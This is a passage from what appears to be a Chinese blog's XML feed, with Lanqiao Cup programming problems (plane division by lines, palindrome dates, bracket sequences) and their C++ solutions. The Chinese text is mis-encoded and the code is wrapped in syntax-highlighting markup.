operator">&gt;&gt;</span>n<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>LL i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>i<span class="token operator">*</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">%</span>i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">int</span> s <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">%</span>i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                n <span class="token operator">=</span> n<span class="token operator">/</span>i<span class="token punctuation">;</span>                s<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">)</span> res<span class="token operator">*=</span>i<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">&gt;</span><span class="token number">1</span><span class="token punctuation">)</span> res<span class="token operator">*=</span>n<span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span>res<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å¹³é¢åˆ‡åˆ†"><a href="#å¹³é¢åˆ‡åˆ†" class="headerlink" title="å¹³é¢åˆ‡åˆ†"></a>å¹³é¢åˆ‡åˆ†</h2><p>å¹³é¢ä¸Šæœ‰ $N$ æ¡ç›´çº¿ï¼Œå…¶ä¸­ç¬¬ $i$ æ¡ç›´çº¿æ˜¯ $y = A_i Â· x + B_i$ã€‚</p><p>è¯·è®¡ç®—è¿™äº›ç›´çº¿å°†å¹³é¢åˆ†æˆäº†å‡ ä¸ªéƒ¨åˆ†ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-2"><a href="#è¾“å…¥æ ¼å¼-2" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>ç¬¬ä¸€è¡ŒåŒ…å«ä¸€ä¸ªæ•´æ•° $N$ã€‚</p><p>ä»¥ä¸‹ $N$ è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° $A_i, B_i$ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-2"><a href="#è¾“å‡ºæ ¼å¼-2" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>ä¸€ä¸ªæ•´æ•°ä»£è¡¨ç­”æ¡ˆã€‚</p><h4 id="æ•°æ®èŒƒå›´-2"><a href="#æ•°æ®èŒƒå›´-2" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>å¯¹äº $50%$ çš„è¯„æµ‹ç”¨ä¾‹ï¼Œ$1 â‰¤ N â‰¤ 4, âˆ’10 â‰¤ A_i, B_i â‰¤ 10$ã€‚<br>å¯¹äºæ‰€æœ‰è¯„æµ‹ç”¨ä¾‹ï¼Œ$1 â‰¤ N â‰¤ 1000, âˆ’100000 â‰¤ A_i, B_i â‰¤ 100000$ã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š-1"><a href="#è¾“å…¥æ ·ä¾‹ï¼š-1" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">31 12 23 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š-1"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š-1" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="é¢˜è§£ï¼š-2"><a href="#é¢˜è§£ï¼š-2" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">double</span> s<span class="token punctuation">[</span><span class="token number">1010</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//å­˜å‚¨ç›´çº¿çš„Aï¼ŒB </span><span class="token keyword">long</span> <span class="token keyword">long</span> ans<span class="token punctuation">;</span>bool st<span class="token punctuation">[</span><span class="token number">1010</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//falseè¡¨ç¤ºä¸æ˜¯é‡è¾¹ </span>pair<span class="token operator">&lt;</span><span class="token keyword">long</span> <span class="token keyword">double</span><span class="token punctuation">,</span><span class="token keyword">long</span> <span class="token keyword">double</span><span class="token operator">&gt;</span> p<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> n<span class="token punctuation">;</span>cin<span class="token operator">&gt;&gt;</span>n<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>cin<span class="token operator">&gt;&gt;</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&gt;&gt;</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>set<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">long</span> <span class="token keyword">double</span><span class="token punctuation">,</span><span class="token keyword">long</span> <span class="token keyword">double</span><span class="token operator">&gt;</span> <span class="token operator">&gt;</span> points<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>i<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>st<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token comment">//ç›´çº¿æ˜¯é‡è¾¹ï¼Œè·³è¿‡ </span><span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//ä¸¤æ¡ç›´çº¿æ–œç‡ç›¸ç­‰æ—¶ï¼Œåˆ¤æ–­æ˜¯å¹³è¡Œè¿˜æ˜¯é‡åˆ </span><span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>st<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>true<span class="token punctuation">;</span><span class="token comment">//å¾…æ·»åŠ ç›´çº¿æ˜¯é‡è¾¹ï¼Œé€€å‡ºå¾ªç¯ </span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token comment">//ç›´çº¿å¹³è¡Œï¼Œä¸éœ€è¦è®¡ç®—äº¤ç‚¹ </span><span class="token punctuation">}</span>p<span class="token punctuation">.</span>first<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//äº¤ç‚¹çš„xåæ ‡ </span>p<span class="token punctuation">.</span>second<span class="token operator">=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>p<span class="token punctuation">.</span>first<span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//äº¤ç‚¹çš„yåæ ‡ </span>points<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>st<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>ans<span class="token operator">+=</span>points<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//è‹¥å½“å‰ç›´çº¿ä¸æ˜¯é‡è¾¹ï¼Œæ›´æ–°ç­”æ¡ˆ </span><span class="token punctuation">}</span>cout<span class="token operator">&lt;&lt;</span>ans<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å›æ–‡æ—¥æœŸ"><a href="#å›æ–‡æ—¥æœŸ" class="headerlink" title="å›æ–‡æ—¥æœŸ"></a>å›æ–‡æ—¥æœŸ</h2><p>$2020$ å¹´æ˜¥èŠ‚æœŸé—´ï¼Œæœ‰ä¸€ä¸ªç‰¹æ®Šçš„æ—¥æœŸå¼•èµ·äº†å¤§å®¶çš„æ³¨æ„ï¼š$2020$ å¹´ $2$ æœˆ $2$ æ—¥ã€‚</p><p>å› ä¸ºå¦‚æœå°†è¿™ä¸ªæ—¥æœŸæŒ‰ â€œ<code>yyyymmdd</code>â€ çš„æ ¼å¼å†™æˆä¸€ä¸ª $8$ ä½æ•°æ˜¯ <code>20200202</code>ï¼Œæ°å¥½æ˜¯ä¸€ä¸ªå›æ–‡æ•°ã€‚</p><p>æˆ‘ä»¬ç§°è¿™æ ·çš„æ—¥æœŸæ˜¯å›æ–‡æ—¥æœŸã€‚</p><p>æœ‰äººè¡¨ç¤º <code>20200202</code> æ˜¯â€œåƒå¹´ä¸€é‡â€ çš„ç‰¹æ®Šæ—¥å­ã€‚</p><p>å¯¹æ­¤å°æ˜å¾ˆä¸è®¤åŒï¼Œå› ä¸ºä¸åˆ° $2$ å¹´ä¹‹åå°±æ˜¯ä¸‹ä¸€ä¸ªå›æ–‡æ—¥æœŸï¼š<code>20211202</code> å³ $2021$ å¹´ $12$ æœˆ $2$ æ—¥ã€‚</p><p>ä¹Ÿæœ‰äººè¡¨ç¤º <code>20200202</code> å¹¶ä¸ä»…ä»…æ˜¯ä¸€ä¸ªå›æ–‡æ—¥æœŸï¼Œè¿˜æ˜¯ä¸€ä¸ª <code>ABABBABA</code> å‹çš„å›æ–‡æ—¥æœŸã€‚</p><p>å¯¹æ­¤å°æ˜ä¹Ÿä¸è®¤åŒï¼Œå› ä¸ºå¤§çº¦ $100$ å¹´åå°±èƒ½é‡åˆ°ä¸‹ä¸€ä¸ª <code>ABABBABA</code> å‹çš„å›æ–‡æ—¥æœŸï¼š<code>21211212</code> å³ $2121$ å¹´ $12$ æœˆ $12$ æ—¥ã€‚</p><p>ç®—ä¸ä¸Šâ€œåƒå¹´ä¸€é‡â€ï¼Œé¡¶å¤šç®—â€œåƒå¹´ä¸¤é‡â€ã€‚</p><p>ç»™å®šä¸€ä¸ª $8$ ä½æ•°çš„æ—¥æœŸï¼Œè¯·ä½ è®¡ç®—è¯¥æ—¥æœŸä¹‹åä¸‹ä¸€ä¸ªå›æ–‡æ—¥æœŸå’Œä¸‹ä¸€ä¸ª <code>ABABBABA</code> å‹çš„å›æ–‡æ—¥æœŸå„æ˜¯å“ªä¸€å¤©ã€‚</p><h4 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h4><p>ä¸‹ä¸€ä¸ªå›æ–‡æ—¥æœŸå’Œä¸‹ä¸€ä¸ª <code>ABABBABA</code> å‹çš„å›æ–‡æ—¥æœŸå¯èƒ½æ˜¯åŒä¸€å¤©ã€‚</p><p><code>ABABBABA</code> å‹çš„å›æ–‡æ—¥æœŸï¼Œéœ€è¦æ»¡è¶³ $A \neq B$ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-3"><a href="#è¾“å…¥æ ¼å¼-3" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>è¾“å…¥åŒ…å«ä¸€ä¸ªå…«ä½æ•´æ•° $N$ï¼Œè¡¨ç¤ºæ—¥æœŸã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-3"><a href="#è¾“å‡ºæ ¼å¼-3" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡ºä¸¤è¡Œï¼Œæ¯è¡Œ $1$ ä¸ªå…«ä½æ•°ã€‚</p><p>ç¬¬ä¸€è¡Œè¡¨ç¤ºä¸‹ä¸€ä¸ªå›æ–‡æ—¥æœŸï¼Œç¬¬äºŒè¡Œè¡¨ç¤ºä¸‹ä¸€ä¸ª <code>ABABBABA</code> å‹çš„å›æ–‡æ—¥æœŸã€‚</p><h4 id="æ•°æ®èŒƒå›´-3"><a href="#æ•°æ®èŒƒå›´-3" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>å¯¹äºæ‰€æœ‰è¯„æµ‹ç”¨ä¾‹ï¼Œ$10000101 â‰¤ N â‰¤ 89991231$ï¼Œä¿è¯ $N$ æ˜¯ä¸€ä¸ªåˆæ³•æ—¥æœŸçš„ $8$ ä½æ•°è¡¨ç¤ºã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š-2"><a href="#è¾“å…¥æ ·ä¾‹ï¼š-2" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">20200202<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š-2"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š-2" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">2021120221211212<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="é¢˜è§£ï¼š-3"><a href="#é¢˜è§£ï¼š-3" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> month<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">}</span><span class="token punctuation">;</span>bool st1<span class="token punctuation">,</span>st2<span class="token punctuation">;</span><span class="token keyword">int</span> ans1<span class="token punctuation">,</span>ans2<span class="token punctuation">;</span>bool <span class="token function">checkdata</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> y <span class="token operator">=</span> a<span class="token operator">/</span><span class="token number">10000</span><span class="token punctuation">;</span><span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token operator">%</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token keyword">int</span> d <span class="token operator">=</span> a<span class="token operator">%</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>y<span class="token operator">%</span><span class="token number">4</span><span class="token operator">==</span><span class="token number">0</span><span class="token operator">&amp;&amp;</span>y<span class="token operator">%</span><span class="token number">100</span><span class="token operator">!=</span><span class="token number">0</span><span class="token operator">||</span>y<span class="token operator">%</span><span class="token number">400</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>month<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">29</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>m<span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">||</span>m<span class="token operator">&gt;</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token keyword">return</span> false<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>d<span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">||</span>d<span class="token operator">&gt;</span>month<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">return</span> false<span class="token punctuation">;</span><span class="token keyword">return</span> true<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">check_ABAB</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> n <span class="token operator">/</span> <span class="token number">10000000</span> <span class="token punctuation">,</span> b <span class="token operator">=</span> n <span class="token operator">/</span> <span class="token number">1000000</span> <span class="token operator">%</span> <span class="token number">10</span> <span class="token punctuation">,</span> c <span class="token operator">=</span> n <span class="token operator">/</span><span class="token number">100000</span> <span class="token operator">%</span> <span class="token number">10</span> <span class="token punctuation">,</span> d <span class="token operator">=</span> n <span class="token operator">/</span> <span class="token number">10000</span> <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">==</span> c <span class="token operator">&amp;&amp;</span> b <span class="token operator">==</span> d <span class="token operator">&amp;&amp;</span> a <span class="token operator">!=</span> b<span class="token punctuation">)</span>  <span class="token keyword">return</span> true<span class="token punctuation">;</span>    <span class="token keyword">return</span> false<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> data<span class="token punctuation">;</span>cin<span class="token operator">&gt;&gt;</span>data<span class="token punctuation">;</span><span class="token keyword">int</span> year <span class="token operator">=</span> data<span class="token operator">/</span><span class="token number">10000</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>true<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> newdata <span class="token operator">=</span> year<span class="token punctuation">;</span><span class="token keyword">int</span> temp <span class="token operator">=</span> year<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span><span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>newdata <span class="token operator">=</span> newdata<span class="token operator">*</span><span class="token number">10</span><span class="token operator">+</span> temp<span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">;</span>temp<span class="token operator">/=</span><span class="token number">10</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>newdata<span class="token operator">==</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span>year<span class="token operator">++</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkdata</span><span class="token punctuation">(</span>newdata<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>st1<span class="token punctuation">)</span> <span class="token punctuation">{</span>st1 <span class="token operator">=</span> true<span class="token punctuation">;</span>ans1 <span class="token operator">=</span> newdata<span class="token punctuation">;</span>cout<span class="token operator">&lt;&lt;</span>ans1<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkdata</span><span class="token punctuation">(</span>newdata<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">check_ABAB</span><span class="token punctuation">(</span>newdata<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>st2<span class="token punctuation">)</span> <span class="token punctuation">{</span>st2 <span class="token operator">=</span> true<span class="token punctuation">;</span>ans2 <span class="token operator">=</span> newdata<span class="token punctuation">;</span>cout<span class="token operator">&lt;&lt;</span>ans2<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>year<span class="token operator">++</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>st1<span class="token operator">&amp;&amp;</span>st2<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ‹¬å·åºåˆ—"><a href="#æ‹¬å·åºåˆ—" class="headerlink" title="æ‹¬å·åºåˆ—"></a>æ‹¬å·åºåˆ—</h2><p>ç»™å®šä¸€ä¸ªæ‹¬å·åºåˆ—ï¼Œè¦æ±‚å°½å¯èƒ½å°‘åœ°æ·»åŠ è‹¥å¹²æ‹¬å·ä½¿å¾—æ‹¬å·åºåˆ—å˜å¾—åˆæ³•ï¼Œå½“æ·»åŠ å®Œæˆåï¼Œä¼šäº§ç”Ÿä¸åŒçš„æ·»åŠ ç»“æœï¼Œè¯·é—®æœ‰å¤šå°‘ç§æœ¬è´¨ä¸åŒçš„æ·»åŠ ç»“æœã€‚</p><p>ä¸¤ä¸ªç»“æœæ˜¯æœ¬è´¨ä¸åŒçš„æ˜¯æŒ‡å­˜åœ¨æŸä¸ªä½ç½®ä¸€ä¸ªç»“æœæ˜¯å·¦æ‹¬å·ï¼Œè€Œå¦ä¸€ä¸ªæ˜¯å³æ‹¬å·ã€‚</p><p>ä¾‹å¦‚ï¼Œå¯¹äºæ‹¬å·åºåˆ— <code>((()</code>ï¼Œåªéœ€è¦æ·»åŠ ä¸¤ä¸ªæ‹¬å·å°±èƒ½è®©å…¶åˆæ³•ï¼Œæœ‰ä»¥ä¸‹å‡ ç§ä¸åŒçš„æ·»åŠ ç»“æœï¼š<code>()()()ã€()(())ã€(())()ã€(()())</code> å’Œ <code>((()))</code>ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-4"><a href="#è¾“å…¥æ ¼å¼-4" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>è¾“å…¥ä¸€è¡ŒåŒ…å«ä¸€ä¸ªå­—ç¬¦ä¸² $s$ï¼Œè¡¨ç¤ºç»™å®šçš„æ‹¬å·åºåˆ—ï¼Œåºåˆ—ä¸­åªæœ‰å·¦æ‹¬å·å’Œå³æ‹¬å·ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-4"><a href="#è¾“å‡ºæ ¼å¼-4" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°è¡¨ç¤ºç­”æ¡ˆï¼Œç­”æ¡ˆå¯èƒ½å¾ˆå¤§ï¼Œè¯·è¾“å‡ºç­”æ¡ˆé™¤ä»¥ $1000000007$ (å³ $10^9 + 7$) çš„ä½™æ•°ã€‚</p><h4 id="æ•°æ®èŒƒå›´-4"><a href="#æ•°æ®èŒƒå›´-4" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>å¯¹äº $40%$ çš„è¯„æµ‹ç”¨ä¾‹ï¼Œ$|s| â‰¤ 200$ã€‚<br>å¯¹äºæ‰€æœ‰è¯„æµ‹ç”¨ä¾‹ï¼Œ$1 â‰¤ |s| â‰¤ 5000$ã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š-3"><a href="#è¾“å…¥æ ·ä¾‹ï¼š-3" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">((()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š-3"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š-3" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
            <tag> è“æ¡¥æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå¸¸ç”¨APIï¼ˆäºŒï¼‰</title>
      <link href="/2022/04/03/java-chang-yong-api-er/"/>
      <url>/2022/04/03/java-chang-yong-api-er/</url>
      
